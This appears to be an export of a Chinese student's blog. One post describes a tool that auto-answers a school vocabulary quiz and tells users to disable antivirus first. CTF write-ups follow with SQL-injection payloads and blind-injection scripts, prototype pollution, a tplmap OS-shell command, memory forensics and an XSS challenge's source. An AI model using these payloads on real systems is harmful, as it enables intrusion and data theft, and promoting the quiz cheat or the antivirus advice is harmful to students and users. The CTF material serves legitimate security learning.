声明闲着无聊，想写代码。转眼学校里我爱记单词又要开始了，突然想起是不是可以写个小程序 ‘帮助’ 一下记单词？其实上学期的时候写过一个 Python 但是正确率大概在 75% 的样子，并且 10 次运行能有 8 次报错，不得不自己在手机上接着做下去，也就自己能用用，但用着极不舒服，程序跑起来的时候需要双手合十祈祷别崩溃。 正好开学这几天闲来无事，想着重新写一遍这个程序，增加更多的优化，把代码逻辑写写好，并尽可能防止程序意外终止。我 做到了。 现在这个软件要是运行正常的话，正确率在 95% 以上，耗时在4-5分钟。后文会详细讲述实现方法。 但这里要申明的是： 本软件不会记录任何个人信息 软件纯开源，绝无恶意代码，但是因为涉及控制台和一些系统命令，360 会报毒，所以请在打开软件前退出 360 放心使用。 不准贩卖，仅供学习娱乐使用 软件理论上能实现 我爱记单词考试，但还未进行测试，又考虑到还是要好好学习英语，所以软件中考试的选项暂时关闭，若选择了考试，程序将直接退出。 软件加了验证机制，只有拥有 license 的用户才能体验到这个小软件，拥有 License 的用户最好不要传播，后台都有使用记录 玩玩就好，不要滥用，该程序调用的 api 要 付 钱 使用提示(关键) 使用前请退出 360 等杀毒软件！！！ 软件存放路径 必须是英文！你可以放在 D://study/ 下，但请不要放在 D://学习资料/ 下,否则会直接闪退 不能开 VPN 请在网络环境好的情况下使用，使用过程中请不要切换网络（否则会出现不可预估的错误） 软件会调用 Chrome 浏览器，所以想使用的话快去下载吧，版本是 89.xxxx就就行，以后要是 Chrome 有大更新，我会同步发布最新软件 软件会打开 8 个浏览器窗口，不要惊慌，不要乱点击！ 软件采用了多线程，所以使用过程中不要开太多消耗内存的应用 软件运行结束后会出现 ”谢谢“ 二字，随后浏览器窗口会依次自动关闭，所以请耐心你等待 如果程序意外终止，剩下的浏览器窗口请手动关闭 使用说明首先，通过邮箱链接下载软件，解压后有两个.exe程序，请将它们至于任何英文路径下, for example: mainFullBlood_boxed.exe为主程序，另一个为浏览器驱动，这俩一定要放在同级目录，否则必报错 在确保 VPN 等代理工具已关闭，不必要的软件也关闭的情况下，双击运行主程序，但建议最好右键以管理员身份运行 如果开了 VPN 会出现如下界面，程序随即退出: 如果网络情况不好，会显示 ”网络状况不佳“ ，程序随即退出 网络配置正确, 会出现如下 输入密钥界面, 输入你的密钥来继续运行程序吧! (如果你还没有, 快去登记页面申请一个吧，如果你足够幸运，你会拥有密钥！) 密钥正确，直接进入下一步： 现在程序需要你的 上课啦token 但为了防止隐私泄露, 这里不采用杭电账号登录的方式来完成登录 所以程序只需要一串网址 在手机打开 易班app, 进入上课啦小程序，点击右上角三个点，选择 ‘复制链接’，再去手机浏览器百度搜索二维码制作，随便选一个进去 (这里推荐 草料二维码) ，将刚刚的连接复制进去生成二维码。当然，你也可以选择手动在控制台输入那串网址 (如果你的电脑没有摄像头) 接下来回到程序，输入a，回车，此时会弹出摄像软件(如果电脑没有摄像头，选择 a 后会直接退出程序，所以如果电脑没摄像头，请选择 b 手动输入刚刚复制的网址)，将生成的二维码对准电脑摄像头，在识别到二维码后，控制台会输出扫描到的二维码，摄像软件会自动关闭。 随后软件会获取远程字典，并打开八个浏览器窗口 不要关闭这些浏览器，它们弹出来后 会自动最小化，你只需关注控制台的信息即可！ 接着选择 练习(选择考试，程序会直接退出, 因为后台暂时把这个模块锁了)，周也请正确输入，上课啦 里说现在第几周，就输入几, 输错程序也会结束(这不是 bug， 这代码是我写的，并且那八个浏览器窗口得你自己关了)。总而言之，言而总之，千万不能输错。 接下来验证信息, 确认无误后，输入那串表示日期的文字(红色字体全部要输)，敲下回车程序开始运行！ 这里的输出有点乱，因为是多线程的原因，don’t care！ 不出错的话，跑两分钟就结束了，因为有部分题程序决定不了，所以会要你自己来选择，接下来是手动答题，不过所有英文都已经安排了中文翻译，并且能匹配到的词会用明亮的颜色标注出来，所以如果你题目有颜色标注，直接选那个选项就行！这里的 模式 一般来说选n就行，有了远程字典的帮助，不严格模式的正确率也不低 结束后，程序会输出这次的所有答案和成绩等信息，随后的 completed是在执行远程字典同步，这次所有的题目都会录入到本软件服务器中，以后碰到同样的题目就会 100% 正确了！ 最后出现 ”感谢使用”，字样后，浏览器会自动关闭，随后控制台窗口也会自动关闭。 BUG 说明 有时候在手动答题时，控制台会持续输出乱码，类似[033[033[033[033[033[033，不要慌，等它输出一会，会自动结束。具体原因不清楚，应该是在为输入的消息进行添加颜色时，有字符让程序进入了死循环。当然这道题的题目是看不了了，随便敲个答案，按回车继续吧！这个 Bug 出现概率极为不大。 在最后完成手动选择答案后，“最后得分；”一直不输出，因该是网络原因造成的。此时应该还剩三分钟左右，一般来说最后是能提交成功的，但如果保险起见，可以掏出手机，将前面输出的 100 道题答案手动输入提交。 这个 Bug 出现概率也不大。 使用演示(手输网址为例)","link":"/2021/03/15/%E5%88%9A%E5%AD%A6Python%EF%BC%8C%E5%81%9A%E4%BA%86%E4%B8%AA%E7%BB%83%E6%89%8B%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E6%88%91%E7%88%B1%E8%AE%B0%E5%8D%95%E8%AF%8D-%E6%97%A0%E6%95%8C%E8%BE%85%E5%8A%A9/"},{"title":"SQL注入从零开始自学——CTFshow菜鸡学习之路","text":"摘要开始学习 SQL注入啦 web 171 sql语句长这样： 1$sql = &quot;select username,password from user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; 其实很早很早以前完全看不懂 $_GET[] 周围的符号，以为是什么类似于 python f”aaaa{t}aaaa“ 这样子的变量引用. 其实 php 没那么高级，这里是用到了字符串拼接，而且 id 的值是字符串类型，要用引号包裹，所以 id 值的两个单引号被分别安排在了前后两个 sql 语句字符串里了。 第一题不愧是第一题，比较简单，拼接后的语句如下： 1$sql = &quot;select username,password from user where username !='flag' and id = '-1' or 1=1 -- ' limit 1;&quot;; 用户--注释掉了后面的内容，要注意的是用--注释的时候，注释符和注释内容之间要有空格 完成 web 172 这题相较上一题，区别在于用户名那列不能出现 flag 字样，这里我采用联合查询，注意：联合查询，第二个查询语句的查询结果会被拼接到以一个查询结果下面，所以前后两个查询语句的列数要一致 拼接后的 SQL 语句如下： 12$sql = &quot;select username,password from ctfshow_user2 where username !='flag' and id = '1' union select 1,password from ctfshow_user2 where username='flag' -- ' limit 1;&quot;; 输出如下： 这里用 1 代替了用户名，当然也有其他方法，比如说编码： 或者可以用 replace方法，比方说用 flaag 替换 flag 甚至直接换个位置，毕竟只检查用户名那列： 完整演示当然，最完整的注入应该是从爆库爆表爆字段开始，这里演示一下完整过程： 首先爆库，SQL 语句为： 12$sql = &quot;select username,password from ctfshow_user2 where username !='flag' and id = '1' union select 1,database() -- ' limit 1;&quot;; 得到所有库名： 下一步爆表，SQL 语句为： 12$sql = &quot;select username,password from ctfshow_user2 where username !='flag' and id = '1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web') -- ' limit 1;&quot;; 得到所有表名： 下一步爆字段，SQL 语句为： 123$sql = &quot;select username,password from ctfshow_user2 where username !='flag' and id = '1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user2') -- ' limit 1;&quot;; 得到字段： 后面就按最开始的方法做就好了 web 173 这个使用正则在整个输出中搜索 flag，和上题一样的方法, 只要注意表名变了，列数也从 2 变成了 2 12$sql = &quot;select username,password from ctfshow_user3 where username !='flag' and id = '1' union select id,1,password from ctfshow_user2 where username='flag' -- ' limit 1;&quot;; 成功 web 174 这题之前做过了，也不是很难，直接 copy monster663 的方法吧，毕竟 wp 看下来，这位好哥哥的方法还是比较简洁的 这里过滤了所有数字，但是里面必然是会出现数字的，大部分人方法是 使用 replace 方法将 数字用字母组合替换，这位好哥哥想到，先转换成十六进制再做替换，因为输出的十六进制字符串英文字母均为大写，那么做替换的时候只要将数字变成小写字母，后面对输出的处理就会方便很多。 SQL 语句： 1234$sql = &quot;select username,password from ctfshow_user4 where username !='flag' and id = '1' union select 'q',(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'1','q'),'2','w'),'3','e'),'4','r'),'5','t'),'6','y'),'7','u'),'8','i'),'9','o'),'0','p') from ctfshow_user4 where username='flag')-- ' limit 1;&quot;; 这样得到结果： 再把小写英文字符换回数字 最后再转换成文本： OVER web 175 这次直接过滤了所有可打印字符，我最初的想法是把每个字符的16进制值加上一个数让它超过 7f 再返回，但好像没有成功，我也不知道这样可不可行，浏览了别人的 wp 似乎可以直接输出到文件，使用 into outfile 命令。（but不知道为什么前面一题用这个方法行不通呜呜呜） SQL 语句： 12$sql = &quot;select username,password from ctfshow_user5 where username !='flag' and id = '1' union select username,password from ctfshow_user5 into outfile '/var/www/html/flag.txt' -- ' limit 1;&quot;; 然后直接访问文件： 得到 FLAG web 176开始过滤注入 不好意思我不知道这题过滤了啥… web 177 首先 fuzz 一下，发现应该是过滤了空格，然后在准备注释掉 limit 1 时发现 -- ’ 失效了。 总结一下空格的 ByPass %09 %0A %0B %0C %0D %A0 %20 /**/ () 再总结一下注释的方法 –+ – ‘ # %23 然后经过修改后的 sql 语句如下: 1$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '-1'or(1=1)%23' limit 1;&quot;; 然后 flag 就来了 得到 Flag web 178 fuzz 了一下，发现用上题的 payload 直接过了 网上看了看，这题应该是过滤了 空格 和 *，所以不能用/**/，所以可以换成 %09 之类的 也能得到 FLAG web 179 依旧是对传入参数进行了过滤, 那就再 fuzz 一下, 发现是过滤了 空格 ,* 和 %09, 因此还是可以用前两题的 payload 一把梭 当然还可以用 web 177 说明的几种空格绕过方法, 就不演示了 web 180 再用前几题的 payload 已经不行了 fuzz 一下, 应该是过滤了 %23 思来想去, 或许只能直接查询 id了: 但我们并不知道 flag 的 id 是多少，于是写了个脚本 123456789101112131415161718192021import requestsimport jsonurl = &quot;http://a5f1fc29-d4a1-4be7-928b-1496fc6c8e7b.challenge.ctf.show:8080/api/?id=-1'or(id={})and'1&amp;page=1&amp;limit=10&quot;header = { 'Referer': 'http://a5f1fc29-d4a1-4be7-928b-1496fc6c8e7b.challenge.ctf.show:8080/select-waf.php', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' 'Chrome/89.0.4389.114 Safari/537.36', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': '__cfduid=d4763c3084916f1f16f68b0861b79c7471615877828; ' 'UM_distinctid=178432bef221a-087c5d51e683cc-5771031-1f2ca0-178432bef2398 '}for i in range(50): res = requests.get(url=url.format(i), headers=header) Data = res.content.decode('UTF-8') res = json.loads(Data) print(res) 运行! flag 就来了 web 181 ummm这题给了正则匹配的内容, 观察发现用上题的 exp 还能打！ flag 就来了 web 182 相较上题，类型差不多，只不过正则匹配多了 flag，我猜想可能只是为了防止查询用户名为 flag 这样子的语句吧，但是无妨，前两题的方法还能用! flag 又来了 web 183 这题就变了，只回显结果数量，提交方式变成了 POST ，模糊测试一下: 盲猜 flag 在 pass 这列，maybe 只能对 pass 进行字典爆破，并且我们可以在 tableName 后面直接加上条件语句，并配合正则： 网上的脚本似乎都有点问题，于是自己写了一个，值得注意的是，pass 列有 22 条数据，如果爆破的字典顺序不对的话，可能把别的信息爆出来，比方说admin,111，为了保险，我们已经知道了 flag 开头是 ctfshow 于是可以有意的排一下字典顺序 exp： 12345678910111213141516171819202122232425262728import requestsurl = 'http://67b87073-9678-43ba-a23a-7e12fc9c88ef.challenge.ctf.show:8080/select-waf.php'tars = '{_-cxzasdqwerfvtgbyhnujmikolp1234567890}' # 考虑到 ctfShow 的 flag 都是小写的,并且以 ctfshow 开头tmp = ''sign = 0for i in range(1, 50): for tar in tars: payload = { 'tableName': f&quot;(ctfshow_user)where(substr(pass,1,{i}))regexp('{tmp + tar}')&quot; } # print(payload) res = requests.post(url=url, data=payload) # print(res.text) if res.text.find(&quot;$user_count = 1;&quot;) &gt; 0: tmp += tar sign = 1 break if sign == 1: sign = 0 print(tmp) continue if sign == 0: breakprint(&quot;+++++++++++++++&quot;)print(tmp) 一段时间后，完成！ web 184 这不太友好，连 where 和 sleep 都过滤了! 先 fuzz 一下，表名还是 ctfshow_user 因为过滤了 where ，我也不知道该怎么办，于是上网寻求了帮助，发现大佬们用了 right join 的方法，用 on 代替 where，于是自己要去了解了一下。Mysqsl 的 right join 语法是 1select * from table1 right join table2 on table1.id=table2.id; 经过一番研究，这句话的逻辑是，查询出 table2 的整张表，然后依次循环查询结果的每一行，对每一行，又分别以 on 后的句子为条件在 table1 中查询。最后的行数计算方法是，打个比方，如果 table2 有五行，以 on 后句子为条件查询 table1 有六条结果，那最后输出的总行数为 5*6=30 行。 那么先设计一张表 ctfshow_user： 然后做一个简单的 right join： 这里将表分别命名成了 a 和 b，是为了方便写条件式。首先查询 b 表，能查询出五条数据，也就是图中 5 个红框，随后依次循环每条数据并以 on 后的条件进行查询。这里因为 on 后的条件是 1=1，所以应该是恒成立条件，那么表 a 中每一项数据都是匹配的，因此每一条表 b 的数据又对应了 5 条表 a 中的数据，这也是为什么上图中每个红框里又有五条数据。（这里我的个人理解就是，b表有n条数据，就循环多少次，循环体内是对 a 表的遍历，a 表有几行就进行几次循环，每一次循环内的判断条件是 on 后的语句） 基本理解意思后，回到题目，只输出行数。如果 on 后的条件不成立，那么 b 表有几行数据 count(*) 就是几 如果 on 后条件恒成立，那么就会输出 count(*) = 25，前面 1=1 就是个例子。 如果 on 后条件对 a 表某一行成立： 那么 b 表的每一行都能匹配到一个结果，count(*) = 5，和 on 条件全不成立结果是一样的，这样无法区分。但是如果条件是关于 b 表的话： 对于 b 表的前四行，其 pass 列值都不符合条件，故搜索结果为 null，但对于最后一行结果，a 表有5行，就循环五次，每一次的判断条件是b.pass='cctfshow{uebwiubvu2322}'，所以这时候 5 次循环都是成立的，故对应了五条数据。所以 count(*) = 9, 也就是 5 * 2 - 1。很显然这样可以判断出我们的条件语句成立了。 回到原题试试，分析一波，第一次测试可知这里 ctfshow_user 表有 22 行，用 right join 方法，on 后条件对右表成立，那么最后行数应该是 22*2-1=43 行。这里可以结合一下 substr 方法。等号被过滤，这里可以容正则 reg 代替，或者用 like；然后引号被过滤，无法使用&quot;a&quot;这样的字符，故可以用char(97)代替，当然 97 可以换成十六进制。测试一下想法，我们知道第一位是 c ： 十六进制也行： like 也行： 那既然知道 flag 的前几位是 ctfshow，咱转成十六进制试试： 成功！但是这里必须用 regexp，用 like 就不太行。 那么就可以写脚本了！ exp： 12345678910111213141516171819202122232425262728293031323334353637import requestsimport binasciidef encode(s): str_16 = binascii.b2a_hex(s.encode('utf-8')) # 字符串转16进制 return '0x' + str(str_16, encoding=&quot;utf-8&quot;)# print(encode('c'))url = 'http://f954e5be-3bd0-4561-8693-62dae2f5e2bb.challenge.ctf.show:8080/select-waf.php'tars = '{_-cxzasdqwerfvtgbyhnujmikolp1234567890}' # 考虑到 ctfShow 的 flag 都是小写的,并且以 ctfshow 开头tmp = ''sign = 0for i in range(1, 50): for tar in tars: payload = { 'tableName': f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,1,{i})regexp(chr({encode(tmp+tar)})))&quot; } # print(payload) res = requests.post(url=url, data=payload) # print(res.text) if res.text.find(&quot;$user_count = 43;&quot;) &gt; 0: tmp += tar sign = 1 break if sign == 1: sign = 0 print(tmp) continue if sign == 0: breakprint(&quot;+++++++++++++++&quot;)print(tmp) 运行！ 成功！！！ web 185 和上题差不多，只不过多过滤了所有数字。 网上看见张表： 意思是 true + true = 2 这个样子，可以用函数之类的字符串来表示一些数字，那么 a 就是 97 个 true 相加！ 但是有个问题，我前几题的脚本在对每一位进行爆破的时候，十六进制字符串都会带上之前匹配出来的字符，比方说我要匹配第七位，我会将前六位 ctfsho 一起带上转为十六进制放在 regexp 里，这样可以有效防止跑出其他结果（加入有两行，第一行 admin，第二行 damin，那么如果匹配第二位的时候不带上第一位，字典是&quot;abcdefghijklmnopqrstuvwxyz&quot;的话，那么跑出来的结果很可能就是 aamin ） 在这题这样子就行不通了，或许可能是我没想到。我去网上白嫖了代码，其他大佬 的 wp 都是按位爆破的，不带已爆破的字段，不过效果好像真的还行！ exp： 123456789101112131415161718192021222324252627282930313233343536import requestsurl = &quot;http://fd9f9520-7858-41c4-af1c-587d17fcd3fd.challenge.ctf.show:8080/select-waf.php&quot;payload = &quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{},{})regexp(char({})))&quot;tars = '{_-cxzasdqwerfvtgbyhnujmikolp1234567890}'i = 8flag = &quot;ctfshow{&quot;def createNum(n): num = 'true' if num == 1: return 'true' else: for i in range(n - 1): num += '+true' return numwhile True: i += 1 for j in range(127): if chr(j) not in tars: continue data = { &quot;tableName&quot;: payload.format(createNum(i), createNum(1), createNum(j)) } # print(data) response = requests.post(url=url, data=data) if &quot;$user_count = 43;&quot; in response.text: if chr(j) != &quot;.&quot;: flag += chr(j) # print(flag) break print(flag.lower()) 运行！ flag 就来了 web 186 过滤的有亿点多，但是上一题的 exp 还能打！ flag 又来了！ web 187 题目越来越有趣了起来 md5()函数有两个参数，一个是要加密的字符串，另一个是输出格式，可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式 FALSE - 默认。32 字符十六进制数 这题比较简单，只要找到 md5 加密后会出现 ‘or’x就行，非零极为真，网上找来两个ffifdyop、129581926211651571912466741651878684928，可以顺利解决！ flag 不会直接显示出来 web 188","link":"/2021/03/18/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%AD%A6%E2%80%94%E2%80%94CTFshow%E8%8F%9C%E9%B8%A1%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"},{"title":"Hgame week4 Writeup","text":"摘要这周比较忙，只有两天有空看看 hgame 不料肝出来 3题 [TOC] WEB漫无止境的星期日 右键查看网页源代码发现注释： 下载源码，发现三个 EJS 文件，去 Google 了一波，这是个 JavaScript 模板，然后按照官方文档，把源码在本地跑了起来，并掌握了个新技能——JavaScript本地调试。 在 app.js 中，发现了模板注入漏洞。 根据之前的的 JavaScript 调试，可以得知该程序的逻辑：如果是本地访问，该 session 对象的 data 会增加一对 crying: true，而只有 data 中 crying 存在且值为 true 时，用户才能进入 /wish ： 所以解题思路已经蛮清楚了：进入 /wish →模板注入。 抓住一点，若不是本地访问，data 中便不会有 crying，且在 JavaScript 中，万物皆是对象。首先理解继承的查找过程。调用对象属性时, 会查找属性，如果本身没有，则会去__proto__中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有__proto__，那么会去__proto__的显式原型中查找，一直到 null (很好说明了原型才是继承的基础)。 大佬原型链污染讲的不错 又发现： 所有干脆污染原型链。构造 payload：（ 特别注意，数据格式为 json ） 1{&quot;__proto__&quot;:{&quot;crying&quot;:&quot;true&quot;},&quot;discription&quot;:&quot;1&quot;,&quot;name&quot;:&quot;1&quot;} 随后能用该 cookie 顺利进入 wish： 好了第一步完成，下面就是简单的模板注入，我准备直接用 tplmap 来注入。 为了能直接用 tplmap ，我写了个 python 代理程序： 123456789101112131415161718192021222324from flask import Flask, requestimport requestsapp = Flask(__name__)@app.route('/')def index(): cookies = { 'session': 's%3AY8NKPRNPTQ_LwB8YrR8hWmrOmZ1qOLiT.%2BSZ50d8CIyEeN0s%2B%2FSAGemAFfT7JeUqPJEqUhR4vJG0', } data = { 'wishes': request.args.get('a') } res = requests.post('http://macguffin.0727.site:5000/wish', cookies=cookies, data=data) return res.textif __name__ == '__main__': app.run(host=&quot;127.0.0.1&quot;, debug=True, port=9110) 网站 session 更新很快，所以污染原型链后的 cookie 要立刻复制到代理程序运行 ！ 接下来就是 tplmap：(既然已经知道是 ejs ，那么就直接 getshell ) 1tplmap.py -u 'http://127.0.0.1:9110/?a=1' -e ejs --os-shell 结束了…其实当时找 flag 找了好久，实属 linux 操作不太熟练。 MISCAkira 之瞳-1 这题看看完成人数就知道比较简单，所以我选择试试这道题。根据题目表述，可以猜到应该是道内存取证的题，要用到 volatility。但是 kali 2020 似乎没有配 volatility，这给我整傻了。然后我在 GitHub 上找到了 volatility 的包，试图在 win10 编译运行，但还是没搞定（依赖包问题）。最后无奈，又装了个 kali 2019。 查看镜像系统： 1volatility -f important_work.raw imageinfo 发现系统是 Win7SP1x64（之后的语句加上--profile=Win7SP1x64）然后列举进程： 1volatility -f important_work.raw pslist --profile=Win7SP1x64 有一个名为 important_work 的进程，该进程 PID 为 1092 使用提取命令对该进程进行提取（-p的参数为进程ID，-D的参数为保存文件的路径）： 1volatility -f important_work.raw --profile=Win7SP1x64 memdump -p 1092 -D ./ 再使用 foremost 将其分离，可以得到应该zip文件注释里写着压缩包的密码是 sha256 (登录密码) 于是用 hashdump 命令找到登录密码的 NTLM 哈希值： 1volatility -f ./important_work.raw --profile=Win7SP1x64 hashdump 哈希值为 84b0d9c9f830238933e7131d60ac6436再到 Cmd5 网站上进行破解得到登录密码 asdqwe123那么压缩包密码为 20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3 打开压缩包，得到两张图片，分别是原图和加了盲水印的图使用 BlindWaterMark 脚本，得到： hgame{7he_f1ame_brin9s_me_end1ess_9riet} Crypto夺宝大冒险1这道题通过阅读源码，发现是 LCG 算法. 三道题分别是：已知乘数、模数和连续两个值求增量、已知连续三个值和模数，求乘数和增量、已知连续n个值。 直接使用 Crypto 库，但要注意的是，我们求得的值不一定就是答案，所以必须多次尝试。 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from Crypto.Util.number import GCD, inversehost, port = '182.92.108.71', 30641r = 1while True: print(r) r += 1 p = remote(host, port) test1 = p.recvuntil('\\n').decode() test1 = [int(temp) for temp in test1[1:-2].split(', ')] x0 = int(p.recvuntil('\\n').decode()) x1 = int(p.recvuntil('\\n').decode()) c = (x1 - x0 * test1[0]) % test1[1] p.sendline(str(c)) m = int(p.recvuntil('\\n').decode()) x0 = int(p.recvuntil('\\n').decode()) x1 = int(p.recvuntil('\\n').decode()) x2 = int(p.recvuntil('\\n').decode()) a = (x2 - x1) * inverse(x1 - x0, m) % m c = (x2 - x1 * a) % m p.sendline(str(a)) p.sendline(str(c)) x = [] for i in range(7): x.append(int(p.recvuntil('\\n'))) t = [] for i in range(5): t.append(x[i+1] - x[i]) y = [] for i in range(3): y.append(t[i+2] * t[i] - t[i+1] * t[i+1]) m = GCD(y[0], y[2]) p.sendline(str(m)) if b'fail' not in p.recvuntil('\\n'): print(p.recvuntil('\\n').decode()) break p.close() 要尝试好几十次，最后得到 flag。","link":"/2021/02/28/Hgame-week4-Writeup/"},{"title":"一道奇怪的 XSS","text":"摘要HGAME week3 有道 XSS，蛮有意思的，涉及到蛮多知识盲区，现在刚好有空就再来看看 网页长这样，这道题的逻辑是: 在输对验证码后，我们 POST 出去的消息会被管理员看到，并且只有我们拥有了管理员的 token 才能进 FLAG 页面拿到 flag。所以考的就是 XSS。 首先 Ctrl+U查看网页，注释了网页源代码的地址，然后便拥有了网站的源代码。 源码贴一份防止以后想再看找不到了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107@app.route('/')def home(): response = make_response(render_template(&quot;index.html&quot;)) response.headers['Set-Cookie'] = &quot;token=WELCOME TO HGAME 2021.;&quot; response.headers['Content-Security-Policy'] = &quot;default-src 'self'; script-src 'self';&quot; return response@app.route('/preview')def preview(): if session.get('substr'): substr = session['substr'] else: substr = &quot;&quot; response = make_response( render_template(&quot;preview.html&quot;, substr=substr)) return response@app.route('/send', methods=['POST'])def send(): if request.form.get('content'): content = escape_index(request.form['content']) if session.get('contents'): content_list = session['contents'] content_list.append(content) else: content_list = [content] session['contents'] = content_list return &quot;post has been sent.&quot; else: return &quot;WELCOME TO HGAME 2021 :)&quot;@app.route('/search', methods=[&quot;POST&quot;])def replace(): if request.form.get('substr'): session['substr'] = escape_replace(request.form['substr']) return &quot;replace success&quot; else: return &quot;There is no content to search any more&quot;@app.route('/contents', methods=[&quot;GET&quot;])def get_contents(): if session.get('contents'): content_list = jsonify(session['contents']) else: content_list = jsonify('&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! ' 'Maybe it is nearly done now.&lt;/p&gt;', '&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... ' 'And I add some new features to this editor, maybe you can take a try. ' 'But it has not done yet, I\\'m not sure if it can be safe from attacks.&lt;/p&gt;', '&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;', '&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, ' 'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;', '&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. ' 'It really astonished me. Something flashed me.&lt;/p&gt;') return content_list@app.route('/code', methods=[&quot;GET&quot;])def get_code(): if session.get('code'): return Response(response=json.dumps({'code': session['code']}), status=200, mimetype='application/json') else: code = create_code() session['code'] = code return Response(response=json.dumps({'code': code}), status=200, mimetype='application/json')@app.route('/flag')def show_flag(): if request.cookies.get('token') == &quot;29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2&quot;: return &quot;hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}&quot; else: return &quot;Only admin can get the flag, your token shows that you're not admin!&quot;@app.route('/clear')def clear_session(): session['contents'] = [] return &quot;ALL contents are cleared.&quot;def escape_index(original): content = original content_iframe = re.sub( r&quot;^(&lt;?/?iframe)\\s+.*?(src=[\\&quot;'][a-zA-Z/]{1,8}[\\&quot;']).*?(&gt;?)$&quot;, r&quot;\\1 \\2 \\3&quot;, content) if content_iframe != content or re.match(r&quot;^(&lt;?/?iframe)\\s+(src=[\\&quot;'][a-zA-Z/]{1,8}[\\&quot;'])$&quot;, content): return content_iframe else: content = re.sub(r&quot;&lt;*/?(.*?)&gt;?&quot;, r&quot;\\1&quot;, content) return contentdef escape_replace(original): content = original content = re.sub(r&quot;[&lt;&gt;\\&quot;\\\\]&quot;, &quot;&quot;, content) return contentdef create_code(): hashobj = hashlib.md5() hashobj.update(bytes(str(time.time()), encoding='utf-8')) code_hash = hashobj.hexdigest()[:6] return code_hash 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!--/preview --&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;link href=&quot;{{ url_for('static',filename='css/common.css') }}&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt; &lt;title&gt;ONLINE BLOG EDITOR&lt;/title&gt; &lt;script src=&quot;{{ url_for('static',filename='js/jquery-3.5.1.min.js') }}&quot;&gt;&lt;/script&gt; &lt;script&gt; $(function () { $.get(&quot;/contents&quot;).done(function (data) { let content = &quot;{{ substr | safe }}&quot; let output = document.getElementById(&quot;output&quot;) for (let i = 0; i &lt; data.length; i++) { let div = document.createElement(&quot;div&quot;) let substr = new RegExp(content, 'g') div.innerHTML = data[i].replace(substr, `&lt;b class=&quot;search_result&quot;&gt;${content}&lt;/b&gt;`) output.appendChild(div) } }) }) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;header&quot;&gt; &lt;a href=&quot;#&quot;&gt;Online Blog Editor&lt;/a&gt;&lt;/div&gt;&lt;div id=&quot;navigation&quot;&gt; &lt;ol&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Editor&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/flag&quot;&gt;Flag&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Help&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt;&lt;/div&gt;&lt;div id=&quot;main&quot;&gt; &lt;h1 id=&quot;title&quot;&gt;Post to Zuckonit&lt;/h1&gt; &lt;div id=&quot;main-content&quot;&gt; &lt;div id=&quot;output&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!--index.html --&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;!-- source /static/www.zip --&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;link href=&quot;{{ url_for('static',filename='css/common.css') }}&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt; &lt;title&gt;ONLINE BLOG EDITOR&lt;/title&gt; &lt;script src=&quot;{{ url_for('static',filename='js/jquery-3.5.1.min.js') }}&quot;&gt;&lt;/script&gt; &lt;script src=&quot;{{ url_for('static',filename='js/script.js') }}&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;header&quot;&gt; &lt;a href=&quot;#&quot;&gt;Online Blog Editor&lt;/a&gt;&lt;/div&gt;&lt;div id=&quot;navigation&quot;&gt; &lt;ol&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Editor&lt;/a&gt;&lt;/li&gt; 